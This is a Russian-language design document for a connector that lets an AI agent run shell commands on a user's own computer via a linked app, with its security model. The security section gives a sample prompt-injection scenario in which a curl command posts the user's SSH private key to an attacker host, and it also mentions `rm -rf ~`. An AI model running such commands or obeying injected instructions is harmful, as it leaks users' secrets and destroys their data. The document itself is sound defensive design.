# Terminal на устройстве (`terminal`, APP + STATIC) — дизайн

Даёт агенту инструмент **исполнять команды shell на машине пользователя** — через приложение,
которое пользователь сам поставил и залинковал (`apps`). Пайплайны (`ls | grep`, `&&`, редиректы)
поддерживаются тем, что команда исполняется шеллом. Статус — дизайн (не реализовано).

Соседний документ [`terminal.md`](terminal.md) описывает **серверный** двойник (bash в песочнице на
нашей инфраструктуре). Это разные продукты с одинаковым набором тулов, и они не конкурируют.

## Три исполнителя одного контракта

| | Где исполняется | Изоляция | Смысл |
|---|---|---|---|
| ACP (`internal/acp`, реализовано) | IDE пользователя | нет (машина юзера) | работа в открытом проекте, только внутри живой IDE-сессии |
| **`terminal` (этот документ)** | приложение на машине пользователя | нет (машина юзера) | доступ к **его** файлам, сети и окружению из любого канала, без IDE |
| `terminal` + `sandbox-runner` ([`terminal.md`](terminal.md)) | наша песочница (gVisor) | сильная | вычислялка и durable workspace платформы |

Ключевое отличие app-варианта от серверного: **песочницы нет по построению, и это не недостаток
реализации, а суть фичи**. Ценность именно в том, что агент видит машину пользователя — его репозиторий,
его `~/Downloads`, его VPN и его LAN. Всё, что в серверном дизайне решается изоляцией, здесь
решается **разрешением пользователя** (см. §Безопасность). Отсюда же граница применимости: этот коннектор
ставит тот, кто понимает, что даёт агенту shell на своём компьютере.

От ACP отличие в доступности: ACP-тулы существуют только пока открыта сессия из IDE, `terminal` живёт
пока запущено приложение — им можно пользоваться из webchat, из Telegram и из триггера по расписанию.

## Главное решение: контракт тулов на платформе, а не в приложении

Сегодня APP-коннектор ровно один — статическая строка `app` без хендлера
(`ConnectorBootstrap.bootstrap`, traits `ConnectorTraits.app()` = APP + **DYNAMIC**): приложение при
линковке само присылает свой набор тулов в `LinkDeviceRequest.tools`, и он зеркалится в
`connection_tools` (`AppService.syncDeviceCatalog`). Терминал так делать **не должен**:

- контракт, живущий в сборке приложения, разъезжается молча — две версии приложения дадут агенту
  два разных `run_command` с разными полями, и платформа об этом не узнает;
- ABAC режет тул **по имени** (`agent_connection_policies`, `PolicyKind.TOOL`) — правило «этому агенту
  запрещён `run_command`» имеет смысл, только если имя и семантика зафиксированы платформой;
- UI терминала (панель, история команд, подтверждения) невозможно сделать общим для устройств, пока
  платформа не знает, что за тул перед ней;
- скилл агента должен быть один на трёх исполнителей из таблицы выше — а для этого формы тулов
  обязаны совпадать.

Поэтому `terminal` — **первый handler-backed APP-коннектор**: декларация тулов в control-api
(`DefinitionBinding.STATIC`), исполнение на устройстве (`ExecutionKind.APP`). Общий коннектор `app`
остаётся как есть — для произвольных приложений с их собственным набором тулов.

## Что переиспользуется без изменений

| Слой | Что уже есть |
|---|---|
| Аутентификация приложения | ключ `appk…` (`AppService.APP_KEY_PREFIX`), `AppPrincipal`, линковка `POST /app/registration/link` |
| Доставка вызова | `ConnectorService.pushToConnector` → `pushToApp` → Centrifugo-канал `app:<appId>` (`appId` = `connectionId`, поэтому чужой канал недостижим по построению) |
| Возврат результата | `POST /app/tools/result` (`AppToolsController`), `InboundRateLimiter.Scope.TOOL_RESULT`, доставка агенту по `external_id` |
| Листинг тулов | `ToolDefinitionService`, ветка `STATIC` → рефлексия по хендлеру (`ToolSchemaReflector`) |
| ABAC | `agent_connections` (доступность) + `agent_connection_policies` (точечный DENY на тул) |
| Аудит | `tool_call_logs` — вход, выход, ошибка, время |
| Бюджет ожидания | `@Tool(timeoutSeconds)` → `timeout_seconds` в `ToolSpec` → `ToolCallWorkflowImpl` (клэмп 30 минут) |

Ни gRPC-протокол воркера, ни dispatch, ни DBOS-слой не трогаются.

## Что придётся поменять в бэкенде

1. **Маркер хендлера и инвариант бутстрапа.** `ConnectorBootstrap.requireConsistentInstanceBearing`
   сверяет тип хендлера с производной `Connector.isInstanceBearing()` (= есть креды **или**
   `execution_kind = APP`). Хендлер APP-коннектора не является `IntegrationConnectorHandler`, значит
   инвариант падает на старте — сейчас handler-backed APP-коннектор физически невозможен. Нужен третий
   маркер рядом с `InternalConnectorHandler`/`IntegrationConnectorHandler`:

   ```
   /** A connector executed by a connected app: no credentials, the instance's identity is the app registration. */
   public interface AppConnectorHandler extends ConnectorHandler {}
   ```

   и `byHandlerType = handler instanceof IntegrationConnectorHandler || handler instanceof AppConnectorHandler`.
   Инвариант при этом сохраняет смысл (ось «пользователь приносит идентичность экземпляра» по-прежнему
   зафиксирована в двух местах и сверяется), а не ослабляется до «кроме APP не проверяем».
2. **Traits-конструктор** `ConnectorTraits.appStatic()` = `(APP, STATIC)` рядом с существующим `app()`.
3. **Линковка не должна затирать каталог.** `AppService.linkDevice` сейчас безусловно зовёт
   `syncDeviceCatalog` (полная замена `connection_tools`/`connection_triggers` тем, что прислало
   устройство). Для STATIC-коннектора синк надо пропускать: источник истины — код. Вместо этого на
   линковке — **handshake**: приложение присылает в `deviceFeatures` версию протокола терминала и
   заявленные возможности (`terminalProtocol`, `shell`, `os`, `root`); несовместимая версия — отказ в
   линковке с внятным сообщением, а не молчаливо неработающие тулы.
4. **Листинг тулов экземпляра в manage-API.** `ManageAppsController` отдаёт тулы из `App.tools`
   (`AppService.getToolsByAppIdAndUser`) — у STATIC-коннектора это поле пустое. Для таких приложений
   листинг должен идти через `ToolDefinitionService.getCatalogTools(connectorCode)`, иначе в UI
   приложение будет выглядеть «без тулов».
5. **Пакет.** APP-коннектор не internal (это не наши сущности) и не integration (нет кредов) — нужен
   новый `connectors/apps/terminal/` рядом с `internal/` и `integrations/`.

Больше нигде ветвления по `ExecutionKind` нет: `ChannelService`, `AgentService`, `RunContextService`
и `ToolDefinitionService` смотрят только на `definitionBinding`, а он у нас STATIC — уже поддержанный путь.

## Коннектор

```
connectors/apps/terminal/
  TerminalConnectorService   extends BaseConnectorHandler implements AppConnectorHandler
        CONNECTOR_CODE = "terminal"
        traits(): ConnectorTraits.appStatic()   // APP + STATIC
  TerminalToolDeclarations   (@Component) — только @Tool-декларации; тела бросают ConnectorException
```

`TerminalToolDeclarations` существует ради схем: `BaseConnectorHandler` собирает `getTools()`
рефлексией по `@Tool`-методам, а исполнение до них не доходит — `pushToConnector` уводит APP-вызов
в push раньше. Тела методов бросают `ConnectorException("terminal tools are executed by the app")` —
это tripwire на случай, если кто-то в будущем пошлёт вызов мимо dispatch, а не мёртвый код.

Тулы v1 — формы намеренно совпадают с ACP и серверным terminal:

| Тул | Аргументы | Хинты | Бюджет |
|---|---|---|---|
| `run_command` | `command` (строка для shell), `cwd?` | destructive, openWorld | `timeoutSeconds` ≈ 300 |
| `read_file` | `path`, `line?`, `limit?` | readOnly, openWorld | дефолт |
| `list_dir` | `path?` | readOnly, openWorld | дефолт |
| `write_file` | `path`, `content` | destructive, openWorld | дефолт |

Возврат `run_command` — `{stdout, stderr, exitCode, truncated, timedOut}`; на выход жёсткий cap
(сверх трункейта воркера), крупное читается `read_file` кусками.

### Пайплайны — строкой в shell, без DSL

`run_command` принимает **одну строку**, приложение исполняет её через `sh -lc "<command>"` (на
Windows — PowerShell, см. §Открытые вопросы). Пайпы, `&&`, редиректы, глобы и heredoc достаются
бесплатно, и модели натренированы писать именно так.

Структурный DSL (массив стадий, `exec` без шелла) рассматривался и **отвергнут**: он защищает от
инъекции в команду, но здесь автор всей команды — сама модель, и `rm -rf ~` она напишет в любом
синтаксисе. Реальные контроли — подтверждение пользователя, конфайнмент корня, лимиты и аудит, а не
грамматика; DSL стоил бы потери шелл-семантики без выигрыша в модели угроз.

Отличие от ACP стоит держать в голове: там `run_command(command, args[])` исполняется без шелла, и
пайплайн выражается как `command="bash", args=["-lc", "…"]`. У `terminal` поле одно, строкой — это
сознательное расхождение в пользу читаемости; скилл описывает обе формы.

### Модель состояния — stateless

Каждый вызов — свежий shell от корня рабочего каталога (`cwd?` — параметр вызова). `cd`, `export`,
активация venv **не переживают** вызов; модель обходит это цепочками `cd build && make` — ровно так
работает Claude Code. Долгоживущий shell (PTY-сессия) сознательно не берём в v1: он тянет менеджмент
сессий, реконнекты и топтание `cwd`/env между параллельными сессиями агента.

Параллельные сессии одного агента пишут в один каталог и **не сериализуются** — это как двое коллег
в одном репозитории. Инвариант single-writer-per-session относится к DBOS-очереди сообщений
(`sessionId` = ключ партиции), а не к файловой системе; общий каталог его не нарушает.

### Бюджеты: у app-варианта нет 45-секундной стены

В серверном дизайне длинные команды упираются в `agent.tool.poll-timeout`, потому что BACKEND-тул
держит поток `toolExecutor`. Здесь исполнение на устройстве, control-api не держит ничего — ждёт
только воркер, и ждать он умеет по декларации: `@Tool(timeoutSeconds)` доезжает до
`ToolCallWorkflowImpl` с клэмпом 30 минут. Поэтому `run_command` может честно объявить ~5 минут, и
`npm install` в бюджет влезет.

Обратная сторона — **офлайн-приложение**: push уходит в Centrifugo в никуда, и агент молча ждёт весь
бюджет. Значит liveness обязателен уже в v1 (см. §Порядок работ, п. 5): нет живого коннекта — тул
сразу возвращает ошибку «приложение не в сети», а не съедает пять минут рана.

## Безопасность

Модель угроз здесь принципиально иная, чем у серверной песочницы: изоляции нет, радиус поражения —
компьютер пользователя, его сеть и его секреты в окружении.

- **Главный сценарий — не ошибка агента, а prompt injection.** Агент читает письмо, страницу или
  сообщение в Telegram, там инструкция, и `curl attacker -d "$(cat ~/.ssh/id_rsa)"` выполняется с
  машины пользователя. Технически это неотличимо от полезной работы, поэтому единственная настоящая
  защита — человек в цикле.
- **Deny-by-default с подтверждением в приложении.** Первое использование команды — запрос
  пользователю с вариантами «разрешить один раз / разрешить всегда / запретить» (модель permissions
  Claude Code, тот же смысл, что `requirePermission` у ACP). Правила разрешений хранит приложение —
  они про эту машину; в платформу уходит только факт отказа как `error` тул-результата.
- **Корень рабочего каталога фиксируется при линковке** пользователем (не агентом) и не меняется
  тулами; `read_file`/`list_dir`/`write_file` резолвят пути с конфайнментом корнем (нормализация `..`,
  запрет выхода по симлинку). `run_command` конфайнментом не ограничен по природе шелла — это
  осознанно, и именно поэтому у него отдельное подтверждение.
- **Ключ приложения = shell на машине пользователя.** `appk…` хранится приложением в keychain/DPAPI,
  один ключ — одно устройство (линковка второго устройства на тот же ключ уже отбивается конфликтом
  в `AppService.linkDevice`), ротация через `regenerateAppKey`.
- **Точечный запрет через ABAC**: агенту можно оставить `read_file`/`list_dir` и запретить
  `run_command`/`write_file` правилом `PolicyKind.TOOL` — это работает именно потому, что имена тулов
  платформенные.
- **Trust boundary**: `openWorldHint` → воркер оборачивает вывод untrusted-маркером (как у ACP).
- **Аудит**: каждая команда и её результат — строка `tool_call_logs`; для этого коннектора это не
  «на всякий случай», а основной инструмент разбора инцидента.
- **Секретов платформы на устройстве нет** — креды у APP-коннектора отсутствуют по определению,
  LLM-ключи недосягаемы (созвучно правилу «секреты не в DBOS-чекпоинт»).
- **Rate limit** на результаты уже есть (`InboundRateLimiter`); лимит на частоту `run_command`
  per-connection добавляется рядом.

## Что обязано делать приложение

Контракт устройства (пойдёт отдельным документом в `docs/contracts/`, рядом с
[`acp.md`](../../contracts/acp.md)):

1. линковка: `POST /app/registration/link` с `deviceId`, `deviceFeatures.terminalProtocol`, `shell`,
   `os`, `root`; поле `tools` для `terminal` не отправляется (каталог платформенный);
2. подписка на Centrifugo-канал `app:<appId>` (токен — `AppCentrifugoTokenController`);
3. исполнение `toolCall`: shell для `run_command`, конфайнмент корня для fs-тулов, лимиты на время и
   размер вывода, обрезка с флагом `truncated`;
4. UI подтверждений и хранение разрешений;
5. ответ `POST /app/tools/result` — либо `output`, либо `error` (отказ пользователя, таймаут,
   несуществующий путь: всё это **валидный** error-результат, а не молчание — ран продолжается).

## Порядок работ

1. `AppConnectorHandler` + правка инварианта в `ConnectorBootstrap`, `ConnectorTraits.appStatic()`.
2. `connectors/apps/terminal/`: `TerminalConnectorService` + `TerminalToolDeclarations` (4 тула,
   схемы, хинты, бюджеты).
3. `AppService`: пропуск `syncDeviceCatalog` для STATIC + handshake версии протокола на линковке;
   `ManageAppsController` — листинг тулов STATIC-приложений через `ToolDefinitionService`.
4. Скилл `terminal` (`seed/skills/<lang>/terminal/SKILL.md`) — по образцу `acp`: stateless-модель,
   неинтерактивные команды, пайплайны строкой, «спрашивай, если команда деструктивна».
5. Liveness: проверка живого коннекта перед push (presence Centrifugo или heartbeat приложения в
   `apps`), иначе — немедленный error-результат.
6. Документ контракта устройства в `docs/contracts/` + референсное приложение.

## Открытые вопросы / roadmap

- **Фоновые команды**: `run_command(background=true)` + `check_command(handle)` — нужны, когда
  пятиминутного бюджета перестанет хватать (dev-сервер, watcher); альтернатива — строка
  `connector_jobs` (`kind = AGENT`) с доставкой результата триггером.
- **Стриминг вывода**: сейчас результат односоставный (`/app/tools/result`); прогресс длинной команды
  в UI потребует накопителя чанков.
- **Windows**: `sh -lc` там не работает; либо PowerShell как заявленный `shell` в handshake (и скилл
  учитывает это по `deviceFeatures`), либо v1 честно только для macOS/Linux.
- **Файлы устройства во вложения**: промоушен файла с машины в `files` (`agf_…`, см.
  [`files.md`](../../connectors/files.md)) — чтобы агент мог приложить локальный файл в канал.
- **Несколько машин у пользователя**: работает уже сейчас (один `app` = одно устройство, у каждого
  свой `connectionId` и свой `full_code`), но скиллу нужен внятный способ адресовать «рабочий ноут»
  против «домашней машины» — это про именование коннекшенов, не про коннектор.
- **`channelOnly`** (тулы видны только из своего канала) — общий roadmap-пункт с ACP.
